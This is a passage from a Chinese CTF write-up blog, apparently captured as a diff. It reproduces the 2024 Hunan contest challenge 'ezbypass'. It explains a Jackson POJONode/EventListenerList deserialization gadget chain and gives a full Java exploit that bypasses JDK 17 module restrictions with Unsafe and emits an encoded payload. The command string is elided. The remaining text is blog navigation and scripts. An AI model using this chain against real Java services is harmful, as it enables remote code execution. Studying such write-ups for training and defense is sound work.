+<p>有jackson那么可以利用<code>POJONode</code> 类去触发getter，还需要一个触发<code>POJONode</code> 的toString方法的类，经典的<code>BadAttributeValueExpException</code> 类在jdk17下无法使用，不过有个前不久爆出来的<code>EventListenerList</code> 可以用，那么现在就差个sink点了，出题人在User类下写了个<code>getResult</code> 方法这个类也是可以被序列化的</p>
+<p>完整exp:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.ezbypass.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> jdk.jshell.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> test.class;</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(currentClass, addr, baseModule);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;chenxun&quot;</span>, cmd);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line"></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(node);</span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Map.class, manager&#125;);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(list);</span><br><span class="line">        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(bytes)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> field.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250922113037204.png" alt="image-20250922113037204" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/OGNL%E6%B3%A8%E5%85%A5/" rel="tag">OGNL注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">jackson反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-spawn/" rel="tag">js原型链污染(spawn)</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="WMCTF2025web部分题解" class="lazyload">
+          
+        
+        <a href="/2025/09/22/WMCTF2025web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            WMCTF2025web部分题解
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="PolarCTF2025秋季个人挑战赛" class="lazyload">
+        
+      
+      <a href="/2025/09/20/PolarCTF2025%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          PolarCTF2025秋季个人挑战赛
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E9%9D%B6%E6%9C%BApingline"><span class="toc-number">1.</span> <span class="toc-text"> [入口靶机]pingline</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text"> 题解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC1%E6%AD%A5%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 第1步：函数调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC2%E6%AD%A5json%E8%A7%A3%E6%9E%90-%E8%BF%9B%E5%85%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%A3%E6%9E%90%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 第2步：JSON解析 - 进入自定义解析器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#21-%E5%88%9D%E5%A7%8B%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 2.1 初始检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-%E6%8F%90%E5%8F%96%E5%86%85%E9%83%A8%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 2.2 提取内部内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> 2.3 正则表达式匹配</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24-%E5%80%BC%E5%A4%84%E7%90%86-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.2.4.</span> <span class="toc-text"> 2.4 值处理 - 字符串类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#25-%E8%BF%94%E5%9B%9E%E8%A7%A3%E6%9E%90%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.2.5.</span> <span class="toc-text"> 2.5 返回解析结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC3%E6%AD%A5%E5%87%86%E5%A4%87ping%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 第3步：准备ping命令参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC4%E6%AD%A5%E6%89%A7%E8%A1%8Cping%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%94%B6%E9%9B%86%E8%BE%93%E5%87%BA"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 第4步：执行ping命令并收集输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-shell%E4%B8%BAtrue"><span class="toc-number">1.3.</span> <span class="toc-text"> 法一  shell为true</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-shell%E4%B8%BAbash%E7%AD%89"><span class="toc-number">1.4.</span> <span class="toc-text"> 法二 shell为bash等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%B1%A1%E6%9F%93%E6%88%90%E5%8A%9F"><span class="toc-number">1.5.</span> <span class="toc-text"> 问题-为什么能污染成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BAezbypass"><span class="toc-number">2.</span> <span class="toc-text"> [内网靶机]ezbypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text"> 读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A31%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5"><span class="toc-number">2.2.</span> <span class="toc-text"> 题解1（环境问题复现失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A32%E5%A4%9A%E4%BD%99"><span class="toc-number">2.3.</span> <span class="toc-text"> 题解2（多余）</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "2024年湖南省网络攻防赛道赛题复现",
+          url: "http://example.com/2025/09/21/2024%E5%B9%B4%E6%B9%96%E5%8D%97%E7%9C%81%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  [入口靶机]pingline 考点:spawn 命令的Prototype Pollution to RCE 分析  前置知识 新版JS Prototype Pollution to RCE学习解析-先知社区  spawn 的工作方式 1const proc = spawn(&amp;quot;ping&amp;quot;, [`-c$&amp;#123;count&amp;#125;`, body.ip!, &amp;quot;-W1&amp;quot;], &amp;#123;...&amp;#125;); 这里的 spawn 函数是 参数化",
+          date: "Sun Sep 21 2025 18:35:25 GMT+0800",
+          updated: "Wed Dec 10 2025 16:13:25 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
